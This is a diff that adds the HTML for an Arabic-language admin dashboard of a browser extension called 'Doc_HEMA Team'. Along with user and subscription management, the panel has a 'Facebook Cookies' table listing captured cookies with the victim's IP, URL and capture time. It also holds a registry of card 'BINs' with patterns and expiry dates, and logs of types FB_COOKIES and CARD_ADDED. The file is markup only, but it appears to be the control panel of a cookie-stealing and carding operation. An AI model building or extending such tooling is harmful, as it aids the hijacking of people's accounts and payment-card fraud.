@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>لوحة التحكم - Doc_HEMA Team</title>
+    <link rel="stylesheet" href="admin.css">
+</head>
+
+<body>
+    <!-- Login Screen -->
+    <div id="login-screen" class="login-screen">
+        <div class="login-card">
+            <div class="logo">🔐</div>
+            <h1>لوحة التحكم</h1>
+            <p>Doc_HEMA Team Extension</p>
+
+            <form id="login-form">
+                <div class="form-group">
+                    <label for="admin-email">البريد الإلكتروني</label>
+                    <input type="email" id="admin-email" required placeholder="admin@example.com">
+                </div>
+                <div class="form-group">
+                    <label for="admin-password">كلمة المرور</label>
+                    <input type="password" id="admin-password" required placeholder="••••••••">
+                </div>
+                <button type="submit" class="btn btn-primary btn-block">
+                    <span id="login-text">تسجيل الدخول</span>
+                    <span id="login-spinner" class="spinner" style="display:none;"></span>
+                </button>
+            </form>
+
+            <div id="login-error" class="alert alert-error" style="display:none;"></div>
+        </div>
+    </div>
+
+    <!-- Main Dashboard -->
+    <div id="dashboard" class="dashboard" style="display:none;">
+        <!-- Sidebar -->
+        <aside class="sidebar">
+            <div class="sidebar-header">
+                <h2>🛡️ Doc_HEMA</h2>
+                <span class="version">Admin Panel v1.0</span>
+            </div>
+
+            <nav class="sidebar-nav">
+                <a href="#" class="nav-item active" data-section="overview">
+                    <span class="icon">📊</span>
+                    <span>نظرة عامة</span>
+                </a>
+                <a href="#" class="nav-item" data-section="users">
+                    <span class="icon">👥</span>
+                    <span>المستخدمين</span>
+                </a>
+                <a href="#" class="nav-item" data-section="subscriptions">
+                    <span class="icon">💳</span>
+                    <span>الاشتراكات</span>
+                </a>
+                <a href="#" class="nav-item" data-section="bins">
+                    <span class="icon">🏦</span>
+                    <span>BINs</span>
+                </a>
+                <a href="#" class="nav-item" data-section="cookies">
+                    <span class="icon">🍪</span>
+                    <span>Cookies</span>
+                </a>
+                <a href="#" class="nav-item" data-section="logs">
+                    <span class="icon">📜</span>
+                    <span>السجلات</span>
+                </a>
+            </nav>
+
+            <div class="sidebar-footer">
+                <button id="logout-btn" class="btn btn-secondary btn-block">
+                    <span class="icon">🚪</span>
+                    تسجيل الخروج
+                </button>
+            </div>
+        </aside>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <!-- Header -->
+            <header class="header">
+                <h1 id="page-title">نظرة عامة</h1>
+                <div class="header-actions">
+                    <button id="refresh-btn" class="btn btn-secondary">
+                        <span class="icon">🔄</span>
+                        تحديث
+                    </button>
+                </div>
+            </header>
+
+            <!-- Overview Section -->
+            <section id="section-overview" class="section">
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="stat-icon">👥</div>
+                        <div class="stat-info">
+                            <span class="stat-value" id="total-users">0</span>
+                            <span class="stat-label">المستخدمين</span>
+                        </div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon">✅</div>
+                        <div class="stat-info">
+                            <span class="stat-value" id="active-subs">0</span>
+                            <span class="stat-label">اشتراكات نشطة</span>
+                        </div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon">🏦</div>
+                        <div class="stat-info">
+                            <span class="stat-value" id="total-bins">0</span>
+                            <span class="stat-label">BINs مسجلة</span>
+                        </div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon">📜</div>
+                        <div class="stat-info">
+                            <span class="stat-value" id="total-logs">0</span>
+                            <span class="stat-label">إجمالي العمليات</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>آخر العمليات</h3>
+                    <div id="recent-logs" class="recent-logs">
+                        <p class="loading">جاري التحميل...</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Users Section -->
+            <section id="section-users" class="section" style="display:none;">
+                <div class="section-header">
+                    <h2>إدارة المستخدمين</h2>
+                    <button id="add-user-btn" class="btn btn-primary">
+                        <span class="icon">➕</span>
+                        إضافة مستخدم
+                    </button>
+                </div>
+
+                <div class="card">
+                    <div class="table-container">
+                        <table id="users-table">
+                            <thead>
+                                <tr>
+                                    <th>الاسم</th>
+                                    <th>البريد</th>
+                                    <th>الجهاز</th>
+                                    <th>آخر دخول</th>
+                                    <th>الحالة</th>
+                                    <th>الإجراءات</th>
+                                </tr>
+                            </thead>
+                            <tbody id="users-tbody">
+                                <tr>
+                                    <td colspan="6" class="loading">جاري التحميل...</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Subscriptions Section -->
+            <section id="section-subscriptions" class="section" style="display:none;">
+                <div class="section-header">
+                    <h2>إدارة الاشتراكات</h2>
+                    <button id="add-sub-btn" class="btn btn-primary">
+                        <span class="icon">➕</span>
+                        إضافة اشتراك
+                    </button>
+                </div>
+
+                <div class="card">
+                    <div class="table-container">
+                        <table id="subs-table">
+                            <thead>
+                                <tr>
+                                    <th>المستخدم</th>
+                                    <th>الخطة</th>
+                                    <th>تاريخ الانتهاء</th>
+                                    <th>الحالة</th>
+                                    <th>الإجراءات</th>
+                                </tr>
+                            </thead>
+                            <tbody id="subs-tbody">
+                                <tr>
+                                    <td colspan="5" class="loading">جاري التحميل...</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </section>
+
+            <!-- BINs Section -->
+            <section id="section-bins" class="section" style="display:none;">
+                <div class="section-header">
+                    <h2>BINs المسجلة</h2>
+                    <div class="filter-group">
+                        <input type="text" id="bin-filter" placeholder="بحث عن BIN...">
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="table-container">
+                        <table id="bins-table">
+                            <thead>
+                                <tr>
+                                    <th>المستخدم</th>
+                                    <th>Pattern</th>
+                                    <th>الاسم</th>
+                                    <th>Expiry</th>
+                                    <th>تاريخ الإنشاء</th>
+                                    <th>الإجراءات</th>
+                                </tr>
+                            </thead>
+                            <tbody id="bins-tbody">
+                                <tr>
+                                    <td colspan="6" class="loading">جاري التحميل...</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Cookies Section -->
+            <section id="section-cookies" class="section" style="display:none;">
+                <div class="section-header">
+                    <h2>Facebook Cookies</h2>
+                </div>
+
+                <div class="card">
+                    <div class="table-container">
+                        <table id="cookies-table">
+                            <thead>
+                                <tr>
+                                    <th>المستخدم</th>
+                                    <th>IP</th>
+                                    <th>URL</th>
+                                    <th>تاريخ الالتقاط</th>
+                                    <th>الإجراءات</th>
+                                </tr>
+                            </thead>
+                            <tbody id="cookies-tbody">
+                                <tr>
+                                    <td colspan="5" class="loading">جاري التحميل...</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Logs Section -->
+            <section id="section-logs" class="section" style="display:none;">
+                <div class="section-header">
+                    <h2>سجلات العمليات</h2>
+                    <div class="filter-group">
+                        <select id="log-type-filter">
+                            <option value="">جميع الأنواع</option>
+                            <option value="BIN_REGISTERED">BIN_REGISTERED</option>
+                            <option value="FB_COOKIES">FB_COOKIES</option>
+                            <option value="CARD_ADDED">CARD_ADDED</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="table-container">
+                        <table id="logs-table">
+                            <thead>
+                                <tr>
+                                    <th>المستخدم</th>
+                                    <th>النوع</th>
+                                    <th>IP</th>
+                                    <th>البيانات</th>
+                                    <th>التاريخ</th>
+                                </tr>
+                            </thead>
+                            <tbody id="logs-tbody">
+                                <tr>
+                                    <td colspan="5" class="loading">جاري التحميل...</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <!-- Add User Modal -->
+    <div id="add-user-modal" class="modal" style="display:none;">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>إضافة مستخدم جديد</h3>
+                <button class="modal-close">&times;</button>
+            </div>
+            <form id="add-user-form">
+                <div class="form-group">
+                    <label>اسم المستخدم</label>
+                    <input type="text" id="new-username" required>
+                </div>
+                <div class="form-group">
+                    <label>البريد الإلكتروني</label>
+                    <input type="email" id="new-email" required>
+                </div>
+                <div class="form-group">
+                    <label>كلمة المرور</label>
+                    <input type="password" id="new-password" required>
+                </div>
+                <div class="form-group">
+                    <label>اسم الجهاز</label>
+                    <input type="text" id="new-device" value="Chrome Extension">
+                </div>
+                <div class="form-actions">
+                    <button type="button" class="btn btn-secondary modal-close-btn">إلغاء</button>
+                    <button type="submit" class="btn btn-primary">إضافة</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Add Subscription Modal -->
+    <div id="add-sub-modal" class="modal" style="display:none;">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>إضافة اشتراك</h3>
+                <button class="modal-close">&times;</button>
+            </div>
+            <form id="add-sub-form">
+                <div class="form-group">
+                    <label>معرف المستخدم</label>
+                    <input type="text" id="sub-user-id" required>
+                </div>
+                <div class="form-group">
+                    <label>نوع الخطة</label>
+                    <select id="sub-plan" required>
+                        <option value="monthly">شهري</option>
+                        <option value="yearly">سنوي</option>
+                        <option value="lifetime">مدى الحياة</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>تاريخ الانتهاء</label>
+                    <input type="date" id="sub-expiry" required>
+                </div>
+                <div class="form-actions">
+                    <button type="button" class="btn btn-secondary modal-close-btn">إلغاء</button>
+                    <button type="submit" class="btn btn-primary">إضافة</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script src="admin.js"></script>
+</body>
+
+</html>
